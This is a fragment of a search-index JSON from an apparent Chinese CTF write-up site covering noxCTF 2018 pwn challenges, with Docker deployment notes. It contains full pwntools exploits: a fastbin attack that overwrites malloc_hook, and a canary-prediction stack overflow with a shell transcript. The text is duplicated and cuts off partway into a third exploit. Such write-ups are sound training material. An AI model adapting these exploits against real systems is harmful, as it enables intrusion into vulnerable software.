OJ"},{"location":"introduction/resources/#ctf_1","text":"\u770b\u96ea\u5de5\u5177 \u543e\u7231\u7834\u89e3\u5de5\u5177 CTF\u5728\u7ebf\u5de5\u5177 by CTFcode CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team ctf-tools by zardus The Cyber Swiss Army Knife","title":"CTF \u5de5\u5177"},{"location":"introduction/resources/#ctf-writeup","text":"CTFs Writeup \u96c6\u9526 CTF solution by p4 team","title":"CTF Writeup \u96c6\u5408"},{"location":"noxCTF2018/pwn/GroceryList/writeup/","text":"\u6f0f\u6d1e\u5206\u6790 \u00b6 \u901a\u8fc7\u9006\u5411\u67e5\u770b\u4ee3\u7801\uff0c\u53d1\u73b0\u53ea\u5141\u8bb80x10\u30010x38\u30010x60\u5927\u5c0f\u7684\u5806\uff0c\u63a8\u65adfastbin attack\u3002 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 1232 IP = \"127.0.0.1\" PORT = 9999 # context.log_level = 'critical' context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./GroceryList\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) def print_list (): sel ( \"1\" ) rud ( \"----------\" ) data = rud ( \"----------\" ) return data def add ( ssize , content ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 2 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"name: \" ) sel ( content ) def empty ( ssize ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 3 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"add?\" ) sel ( str ( 1 )) def example (): sel ( str ( 6 )) rud ( \"added\" ) def edit ( id , content ): sel ( str ( 5 )) rud ( \"edit?\" ) sel ( str ( id )) rud ( \"name: \" ) sel ( content ) def remove ( id ): sel ( str ( 4 )) rud ( \"remove?\" ) sel ( str ( id )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/noxCTF2018/pwn/GroceryList/GroceryList\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] io . recvline () one_gg = 0xf02a4 # gdb.attach(io, ''' # b *0x{:x} # b *0x{:x} # c # '''.format(proc_base+0x0000000000001113, libc_bb + one_gg) # # print_list\u548conegadget\u4e0b\u65ad\u70b9 # ) ##\u5efa2\u4e2a0x20\u5806\uff0c2\u4e2a0x70\u5806\uff0c\u548c\u4e00\u4e2aexample\u5806\uff08\u5176\u4e2d\u5806\u4e0a\u6709\u6808\u5730\u5740\uff09 add ( 1 , \"A\" * 0x10 ) add ( 1 , \"B\" * 0x10 ) add ( 3 , \"C\" * 0x60 ) add ( 3 , \"D\" * 0x60 ) example () ## \u628a\u6240\u6709\u5806\u5185\u5bb9\u6253\u5370\u51fa\u6765\uff0c\u6cc4\u9732\u4e86\u5806\u4e0a\u7684\u6808\u5730\u5740 data = print_list () stack_address = data . split ( \"4. \" )[ 1 ][: 8 ] . strip () stack_address = u64 ( stack_address . ljust ( 8 , \" \\x00 \" )) print \"[+] STAC\" , hex ( stack_address ) # \u5220\u9664\u7b2c2\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x20\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 1 ) # \u901a\u8fc7\u7b2c1\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u7b2c2\u4e2a0x20\u5806\u7684fd\u5730\u5740\uff0c\u4e3a\u6808\u4e0a\u5730\u5740\uff0c\u7528\u4e8e\u6cc4\u9732libc_start_main\u5730\u5740 edit ( 0 , \"d\" * 16 + p64 ( 0 ) + p64 ( 0x21 ) + p64 ( stack_address - 0xb - 0x10 )) # \u7533\u8bf70x20\u5927\u5c0f\u5806\u5757\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3a\u6808\u4e0a\u5730\u5740 empty ( 1 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5373\u5728\u6808\u4e0a empty ( 1 ) # \u6b64\u65f6\u6cc4\u9732libc\u5730\u5740 data = print_list () print \"[+] \" , data libc_address = data . split ( \"5. \" )[ 1 ][: 8 ] . strip ( \" \\n \" ) libc_address = u64 ( libc_address . ljust ( 8 , \" \\x00 \" )) libc_base = libc_address - 0x20740 - 240 print \"[+] LIBC\" , hex ( libc_base ) # \u7f16\u8f91\u6808\u4e0a\u5806\u5757\uff0c\u5199\u4e00\u58060\uff0c\u4e3a\u540e\u7eedone_gadget\u7684\u6761\u4ef6\u505a\u51c6\u5907\uff0c\u9650\u5b9a\u6761\u4ef6\u4e3arsp+0x50=null\u3002 edit ( 5 , p64 ( libc_address ) + p64 ( 0 ) * 3 ) ##\u3000\u52200x60\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x60\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 2 ) print_list () one_gadget_address = libc_base + one_gg new_malloc_hook = libc_base + 0x00000000003c4b10 - 0x20 + 0x5 - 0x8 # \u7f16\u8bd1\u7b2c1\u4e2a0x70\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u5230\u540e\u9762\u7684\u7b2c2\u4e2a0x70\u5806\uff0c\u4f7f\u5176fd\u4e3amalloc_hook-0x23 edit ( 1 , \"d\" * 0x60 + p64 ( 0 ) + p64 ( 0x71 ) + p64 ( new_malloc_hook )) print_list () # \u7533\u8bf70x70\u5927\u5c0f\u5806\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3amalloc_hook-0x23+0x10 empty ( 3 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5728malloc_hook\u9644\u8fd1 empty ( 3 ) print_list () # \u4f7f\u7528\u65b0\u5806\u5757\u8986\u76d6malloc_hook\u7684\u5730\u5740\uff0c\u8986\u76d6\u5185\u5bb9\u4e3aone_gadget\u5730\u5740 edit ( 6 , \"A\" * 19 + p64 ( one_gadget_address )) print_list () # \u89e6\u53d1\u6f0f\u6d1e empty ( 1 ) io . interactive ()","title":"Grocery List"},{"location":"noxCTF2018/pwn/GroceryList/writeup/#_1","text":"\u901a\u8fc7\u9006\u5411\u67e5\u770b\u4ee3\u7801\uff0c\u53d1\u73b0\u53ea\u5141\u8bb80x10\u30010x38\u30010x60\u5927\u5c0f\u7684\u5806\uff0c\u63a8\u65adfastbin attack\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"noxCTF2018/pwn/GroceryList/writeup/#_2","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 1232 IP = \"127.0.0.1\" PORT = 9999 # context.log_level = 'critical' context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./GroceryList\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) def print_list (): sel ( \"1\" ) rud ( \"----------\" ) data = rud ( \"----------\" ) return data def add ( ssize , content ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 2 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"name: \" ) sel ( content ) def empty ( ssize ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 3 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"add?\" ) sel ( str ( 1 )) def example (): sel ( str ( 6 )) rud ( \"added\" ) def edit ( id , content ): sel ( str ( 5 )) rud ( \"edit?\" ) sel ( str ( id )) rud ( \"name: \" ) sel ( content ) def remove ( id ): sel ( str ( 4 )) rud ( \"remove?\" ) sel ( str ( id )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/noxCTF2018/pwn/GroceryList/GroceryList\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] io . recvline () one_gg = 0xf02a4 # gdb.attach(io, ''' # b *0x{:x} # b *0x{:x} # c # '''.format(proc_base+0x0000000000001113, libc_bb + one_gg) # # print_list\u548conegadget\u4e0b\u65ad\u70b9 # ) ##\u5efa2\u4e2a0x20\u5806\uff0c2\u4e2a0x70\u5806\uff0c\u548c\u4e00\u4e2aexample\u5806\uff08\u5176\u4e2d\u5806\u4e0a\u6709\u6808\u5730\u5740\uff09 add ( 1 , \"A\" * 0x10 ) add ( 1 , \"B\" * 0x10 ) add ( 3 , \"C\" * 0x60 ) add ( 3 , \"D\" * 0x60 ) example () ## \u628a\u6240\u6709\u5806\u5185\u5bb9\u6253\u5370\u51fa\u6765\uff0c\u6cc4\u9732\u4e86\u5806\u4e0a\u7684\u6808\u5730\u5740 data = print_list () stack_address = data . split ( \"4. \" )[ 1 ][: 8 ] . strip () stack_address = u64 ( stack_address . ljust ( 8 , \" \\x00 \" )) print \"[+] STAC\" , hex ( stack_address ) # \u5220\u9664\u7b2c2\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x20\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 1 ) # \u901a\u8fc7\u7b2c1\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u7b2c2\u4e2a0x20\u5806\u7684fd\u5730\u5740\uff0c\u4e3a\u6808\u4e0a\u5730\u5740\uff0c\u7528\u4e8e\u6cc4\u9732libc_start_main\u5730\u5740 edit ( 0 , \"d\" * 16 + p64 ( 0 ) + p64 ( 0x21 ) + p64 ( stack_address - 0xb - 0x10 )) # \u7533\u8bf70x20\u5927\u5c0f\u5806\u5757\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3a\u6808\u4e0a\u5730\u5740 empty ( 1 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5373\u5728\u6808\u4e0a empty ( 1 ) # \u6b64\u65f6\u6cc4\u9732libc\u5730\u5740 data = print_list () print \"[+] \" , data libc_address = data . split ( \"5. \" )[ 1 ][: 8 ] . strip ( \" \\n \" ) libc_address = u64 ( libc_address . ljust ( 8 , \" \\x00 \" )) libc_base = libc_address - 0x20740 - 240 print \"[+] LIBC\" , hex ( libc_base ) # \u7f16\u8f91\u6808\u4e0a\u5806\u5757\uff0c\u5199\u4e00\u58060\uff0c\u4e3a\u540e\u7eedone_gadget\u7684\u6761\u4ef6\u505a\u51c6\u5907\uff0c\u9650\u5b9a\u6761\u4ef6\u4e3arsp+0x50=null\u3002 edit ( 5 , p64 ( libc_address ) + p64 ( 0 ) * 3 ) ##\u3000\u52200x60\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x60\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 2 ) print_list () one_gadget_address = libc_base + one_gg new_malloc_hook = libc_base + 0x00000000003c4b10 - 0x20 + 0x5 - 0x8 # \u7f16\u8bd1\u7b2c1\u4e2a0x70\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u5230\u540e\u9762\u7684\u7b2c2\u4e2a0x70\u5806\uff0c\u4f7f\u5176fd\u4e3amalloc_hook-0x23 edit ( 1 , \"d\" * 0x60 + p64 ( 0 ) + p64 ( 0x71 ) + p64 ( new_malloc_hook )) print_list () # \u7533\u8bf70x70\u5927\u5c0f\u5806\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3amalloc_hook-0x23+0x10 empty ( 3 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5728malloc_hook\u9644\u8fd1 empty ( 3 ) print_list () # \u4f7f\u7528\u65b0\u5806\u5757\u8986\u76d6malloc_hook\u7684\u5730\u5740\uff0c\u8986\u76d6\u5185\u5bb9\u4e3aone_gadget\u5730\u5740 edit ( 6 , \"A\" * 19 + p64 ( one_gadget_address )) print_list () # \u89e6\u53d1\u6f0f\u6d1e empty ( 1 ) io . interactive ()","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/pwn/TheBlackCanary/writeup/","text":"\u6f0f\u6d1e\u5206\u6790 \u00b6 \u53ef\u8f93\u5165\u8d1f\u6570\uff0c\u8fbe\u5230\u6570\u7ec4\u8d8a\u754c\u7684\u76ee\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5411\u540e\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u4f46\u56e0\u6ea2\u51fa\u9650\u5236\uff0c\u5fc5\u987b\u5148\u8986\u76d6canary\uff0c\u800ccanary\u65e0\u6cd5\u6cc4\u9732\u3002 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from time import sleep import os import sys elfPath = \"./TheBlackCanary\" libcPath = \"./libc.so.6\" remoteAddr = \"chal.noxale.com\" remotePort = 6667 context . binary = elfPath elf = context . binary if sys . argv [ 1 ] == \"l\" : io = process ( elfPath ) libc = elf . libc else : if sys . argv [ 1 ] == \"d\" : io = process ( elfPath , env = { \"LD_PRELOAD\" : libcPath }) else : io = remote ( remoteAddr , remotePort ) if libcPath : libc = ELF ( libcPath ) # context.log_level = \"debug\" context . terminal = [ \"deepin-terminal\" , \"-x\" , \"sh\" , \"-c\" ] success = lambda name , value : log . success ( \"{} -> {:#x}\" . format ( name , value )) def DEBUG (): info ( \"PID -> {}\" . format ( io . pid )) raw_input ( \"DEBUG: \" ) def show (): io . sendlineafter ( \"die \\n \" , \"1\" ) def add ( argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"2\" ) io . sendafter ( \": \\n \" , argument ) def edit ( idx , argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"3\" ) io . sendlineafter ( \"? \\n \" , str ( idx )) io . sendlineafter ( \": \\n \" , argument ) def remove_single ( idx ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"1\" ) io . sendlineafter ( \"remove? \\n \" , str ( idx )) def remove_consecutive ( idx_start , num ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"2\" ) io . sendlineafter ( \"start? \\n \" , str ( idx_start )) io . sendlineafter ( \"remove? \\n \" , str ( num )) def leave (): io . sendlineafter ( \"die \\n \" , \"5\" ) get_canary = lambda : int ( os . popen ( \"./set_canary\" ) . read () . strip (), 16 ) if __name__ == \"__main__\" : ''' This challenge named \"The Black Canary\" suggests there must be something interesting with canary. And when I take a look at .init_array, an interesting function appears(I call it set_canary, located at 0x4008C7). unsigned __int64 set_canary() { int v0; // ebx unsigned __int64 v1; // rbx int v2; // er12 unsigned __int64 v3; // ST08_8 time_t v4; // rbx unsigned __int64 v5; // ST08_8 time_t v6; // ST08_8 time_t v7; // ST08_8 unsigned __int64 result; // rax time(0LL); time(0LL); v0 = time(0LL) >> 24; v1 = (unsigned __int64)(unsigned __int8)(v0 ^ (unsigned __int64)getenv(name)) << 24; v2 = time(0LL) >> 16; v3 = v1 + ((unsigned __int64)(unsigned __int8)(v2 ^ (unsigned __int64)getenv(name)) << 16); v4 = time(0LL) >> 8; v5 = (unsigned __int16)((((unsigned __int16)v4 ^ (unsigned __int16)time(0LL)) << 8) & 0xFF00) + v3; v6 = ((time(0LL) << 32) & 0xFF00000000LL) + v5; v7 = time(0LL) + v6; LODWORD(v4) = time(0LL) >> 24; LODWORD(v4) = (time(0LL) >> 16) + v4; LODWORD(v4) = (time(0LL) >> 8) + v4; result = ((unsigned __int64)(unsigned __int8)(v4 + time(0LL)) << 40) + v7; __writefsqword(0x28u, result); return result; } And we know that time(0) is predictable, as a result, we're able to predict canary. So if there is a stack_overflow_bug, this challenge will be easy to be pwned. ''' canary = get_canary () success ( \"canary\" , canary ) ''' The bof bug will appear it we use remove_consecutive() with a negative amount of arguments. void __fastcall remove_consecutive(char *arg_list, _DWORD *cnt) { size_t len; // rax char idx; // [rsp+15h] [rbp-Bh] char remove_num; // [rsp+16h] [rbp-Ah] char i; // [rsp+17h] [rbp-9h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); idx = 0; remove_num = 0; i = 0; print(\"With which argument would you like to start?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &idx); getchar(); if ( idx < 0 || (char)*cnt <= idx ) { print(\"Index not in range\"); } else { print(\"How many arguments would you like to remove?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &remove_num); // negative getchar(); if ( remove_num + idx < (char)*cnt ) { for ( i = 0; i < remove_num; ++i ) { if ( remove_num + i + idx >= (char)*cnt ) { arg_list[32 * (idx + i)] = 0; } else { len = strlen(&arg_list[32 * (i + idx + remove_num)]); strncpy(&arg_list[32 * (idx + i)], &arg_list[32 * (i + idx + remove_num)], len + 1); arg_list[32 * (i + idx + remove_num)] = 0; } } *cnt -= remove_num; // bug here } } } A negative number will lead to cnt be greater than 10, which to say, we can print the content behand arg_list[328] on the stack then we can leak libc. Most importantly, we can use edit(10, payload) to modify retaddr to one_gadget. Then we're able to get a shell. ''' for i in xrange ( 10 ): add ( str ( i ) * 31 ) remove_consecutive ( 9 , '-6' ) show () io . recvuntil ( \" \\x7f \" ) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] + ' \\0\\0 ' ) - 0x5f1168 success ( \"libc\" , libc . address ) # DEBUG() one_gadget = libc . address + 0x45216 edit ( 10 , 'aaaaaaaa' + p64 ( canary ) + 'bbbbbbbb' + p64 ( one_gadget )[: - 1 ]) leave () io . interactive () ''' noxCTF2018_The_Black_Canary [master\u25cf\u25cf] python exp.py r [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/TheBlackCanary' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to chal.noxale.com on port 6667: Done [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] canary -> 0xaa1fb7311f1f [+] libc -> 0x7fbfa7624000 [*] Switching to interactive mode You could have saved them all $ cat flag noxCTF{Mas7er_0f_ROPcha1ns} $ [*] Closed connection to chal.noxale.com port 6667 '''","title":"The Black Canary"},{"location":"noxCTF2018/pwn/TheBlackCanary/writeup/#_1","text":"\u53ef\u8f93\u5165\u8d1f\u6570\uff0c\u8fbe\u5230\u6570\u7ec4\u8d8a\u754c\u7684\u76ee\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5411\u540e\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u4f46\u56e0\u6ea2\u51fa\u9650\u5236\uff0c\u5fc5\u987b\u5148\u8986\u76d6canary\uff0c\u800ccanary\u65e0\u6cd5\u6cc4\u9732\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"noxCTF2018/pwn/TheBlackCanary/writeup/#_2","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from time import sleep import os import sys elfPath = \"./TheBlackCanary\" libcPath = \"./libc.so.6\" remoteAddr = \"chal.noxale.com\" remotePort = 6667 context . binary = elfPath elf = context . binary if sys . argv [ 1 ] == \"l\" : io = process ( elfPath ) libc = elf . libc else : if sys . argv [ 1 ] == \"d\" : io = process ( elfPath , env = { \"LD_PRELOAD\" : libcPath }) else : io = remote ( remoteAddr , remotePort ) if libcPath : libc = ELF ( libcPath ) # context.log_level = \"debug\" context . terminal = [ \"deepin-terminal\" , \"-x\" , \"sh\" , \"-c\" ] success = lambda name , value : log . success ( \"{} -> {:#x}\" . format ( name , value )) def DEBUG (): info ( \"PID -> {}\" . format ( io . pid )) raw_input ( \"DEBUG: \" ) def show (): io . sendlineafter ( \"die \\n \" , \"1\" ) def add ( argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"2\" ) io . sendafter ( \": \\n \" , argument ) def edit ( idx , argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"3\" ) io . sendlineafter ( \"? \\n \" , str ( idx )) io . sendlineafter ( \": \\n \" , argument ) def remove_single ( idx ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"1\" ) io . sendlineafter ( \"remove? \\n \" , str ( idx )) def remove_consecutive ( idx_start , num ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"2\" ) io . sendlineafter ( \"start? \\n \" , str ( idx_start )) io . sendlineafter ( \"remove? \\n \" , str ( num )) def leave (): io . sendlineafter ( \"die \\n \" , \"5\" ) get_canary = lambda : int ( os . popen ( \"./set_canary\" ) . read () . strip (), 16 ) if __name__ == \"__main__\" : ''' This challenge named \"The Black Canary\" suggests there must be something interesting with canary. And when I take a look at .init_array, an interesting function appears(I call it set_canary, located at 0x4008C7). unsigned __int64 set_canary() { int v0; // ebx unsigned __int64 v1; // rbx int v2; // er12 unsigned __int64 v3; // ST08_8 time_t v4; // rbx unsigned __int64 v5; // ST08_8 time_t v6; // ST08_8 time_t v7; // ST08_8 unsigned __int64 result; // rax time(0LL); time(0LL); v0 = time(0LL) >> 24; v1 = (unsigned __int64)(unsigned __int8)(v0 ^ (unsigned __int64)getenv(name)) << 24; v2 = time(0LL) >> 16; v3 = v1 + ((unsigned __int64)(unsigned __int8)(v2 ^ (unsigned __int64)getenv(name)) << 16); v4 = time(0LL) >> 8; v5 = (unsigned __int16)((((unsigned __int16)v4 ^ (unsigned __int16)time(0LL)) << 8) & 0xFF00) + v3; v6 = ((time(0LL) << 32) & 0xFF00000000LL) + v5; v7 = time(0LL) + v6; LODWORD(v4) = time(0LL) >> 24; LODWORD(v4) = (time(0LL) >> 16) + v4; LODWORD(v4) = (time(0LL) >> 8) + v4; result = ((unsigned __int64)(unsigned __int8)(v4 + time(0LL)) << 40) + v7; __writefsqword(0x28u, result); return result; } And we know that time(0) is predictable, as a result, we're able to predict canary. So if there is a stack_overflow_bug, this challenge will be easy to be pwned. ''' canary = get_canary () success ( \"canary\" , canary ) ''' The bof bug will appear it we use remove_consecutive() with a negative amount of arguments. void __fastcall remove_consecutive(char *arg_list, _DWORD *cnt) { size_t len; // rax char idx; // [rsp+15h] [rbp-Bh] char remove_num; // [rsp+16h] [rbp-Ah] char i; // [rsp+17h] [rbp-9h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); idx = 0; remove_num = 0; i = 0; print(\"With which argument would you like to start?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &idx); getchar(); if ( idx < 0 || (char)*cnt <= idx ) { print(\"Index not in range\"); } else { print(\"How many arguments would you like to remove?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &remove_num); // negative getchar(); if ( remove_num + idx < (char)*cnt ) { for ( i = 0; i < remove_num; ++i ) { if ( remove_num + i + idx >= (char)*cnt ) { arg_list[32 * (idx + i)] = 0; } else { len = strlen(&arg_list[32 * (i + idx + remove_num)]); strncpy(&arg_list[32 * (idx + i)], &arg_list[32 * (i + idx + remove_num)], len + 1); arg_list[32 * (i + idx + remove_num)] = 0; } } *cnt -= remove_num; // bug here } } } A negative number will lead to cnt be greater than 10, which to say, we can print the content behand arg_list[328] on the stack then we can leak libc. Most importantly, we can use edit(10, payload) to modify retaddr to one_gadget. Then we're able to get a shell. ''' for i in xrange ( 10 ): add ( str ( i ) * 31 ) remove_consecutive ( 9 , '-6' ) show () io . recvuntil ( \" \\x7f \" ) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] + ' \\0\\0 ' ) - 0x5f1168 success ( \"libc\" , libc . address ) # DEBUG() one_gadget = libc . address + 0x45216 edit ( 10 , 'aaaaaaaa' + p64 ( canary ) + 'bbbbbbbb' + p64 ( one_gadget )[: - 1 ]) leave () io . interactive () ''' noxCTF2018_The_Black_Canary [master\u25cf\u25cf] python exp.py r [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/TheBlackCanary' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to chal.noxale.com on port 6667: Done [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] canary -> 0xaa1fb7311f1f [+] libc -> 0x7fbfa7624000 [*] Switching to interactive mode You could have saved them all $ cat flag noxCTF{Mas7er_0f_ROPcha1ns} $ [*] Closed connection to chal.noxale.com port 6667 '''","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/TheBlackCanary/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/pwn/TheNameCalculator/writeup/","text":"\u6f0f\u6d1e\u5206\u6790 \u00b6 \u53c8\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6700\u540e\u8986\u76d6\u4e86exit\u51fd\u6570\u7684got\u8868\u3002 \u4e2d\u95f4\u6709\u4e2axor\u7f16\u7801\u7684\u8fc7\u7a0b\uff0c\u9700\u8981\u5199\u4e2a\u5bf9\u5e94\u7684\u89e3\u7801\uff08\u4e0e\u7f16\u7801\u4e00\u6837\u6d41\u7a0b\uff09 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 5678 IP = \"127.0.0.1\" PORT = 9999 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = 